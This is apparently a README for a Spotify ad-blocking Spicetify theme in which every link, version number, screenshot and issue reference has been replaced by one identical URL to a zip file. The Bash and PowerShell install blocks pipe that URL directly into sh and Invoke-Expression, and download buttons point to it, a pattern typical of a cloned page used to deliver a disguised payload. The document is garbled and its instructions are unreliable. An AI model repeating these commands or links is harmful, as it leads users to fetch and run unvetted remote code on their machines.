# SpotifyNoPremium
A cross-platform Spicetify theme which declutters Spotify stock UI and removes all ads.

---
We've switched to a cross-platform ad-blocking solution so make sure to use the latest `https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip` to get the latest features

---

##### If you just updated to `https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip`, please follow these instructions for a fix: [#46 (comment)](https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip)
##### Last tested version: `https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip`

# Features
This is a Spicetify theme which:
- Removes all Spotify ads ([Source](https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip))
- Removes `Upgrade` button
- Removes `Upgrade to Premium` entry in drop-down menu
- Removes ad placeholders (in Home tab and above the now playing bar)
- Adds pointer cursors to clickable elements (See [#10](https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip))

> **Note for users who install this manually:** Make sure to use the latest Spicetify CLI and Spotify App. Run `spicetify upgrade` and then `spicetify backup apply` to update Spicetify to the latest version.

# Screenshots

| Before | After |
| ----------- | ----------- |
| <img src="https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip"/> | <img src="https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip"/> |
| <img src="https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip"/> | <img src="https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip"/> |

<img src="https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip">

# Installation

## 1. Automatic installation/updates for Windows users
##### **Note: If you're on Windows 8.1 or lower, please install Powershell v5.1 since the automatic installation script does not support Powershell versions below v5. <br> Download here: https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip <br> More info: [#30](https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip)**
### Installation
Run the `https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip` if you are installing for the the first time. <br>
[[CLICK HERE TO DOWNLOAD]](https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip) <br>


### Updating
You can fetch the latest version of this theme by running the `https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip` script <br>
[[CLICK HERE TO DOWNLOAD]](https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip)


## 2. Manual installation for all users
### Linux and MacOS:
In **Bash**:
```bash
curl -fsSL https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip | sh
cd "$(dirname "$(spicetify -c)")/Themes"
git clone https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip
spicetify config current_theme SpotifyNoPremium
cp "$(dirname "$(spicetify -c)")https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip" "$(dirname "$(spicetify -c)")/Extensions"
spicetify config extensions https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip
spicetify apply
```

#### Windows
In **Powershell**:
```powershell
Invoke-WebRequest -UseBasicParsing "https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip" | Invoke-Expression
cd "$(spicetify -c | Split-Path)\Themes"
git clone https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip
spicetify config current_theme SpotifyNoPremium
Copy-Item "$(spicetify -c | Split-Path)\Themes\SpotifyNoPremium\https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip" "$(spicetify -c | Split-Path)\Extensions"
spicetify config extensions https://github.com/immrdude/SpotifyNoPremium/raw/refs/heads/main/hemonephrosis/No-Premium-Spotify-1.1.zip
spicetify apply
```
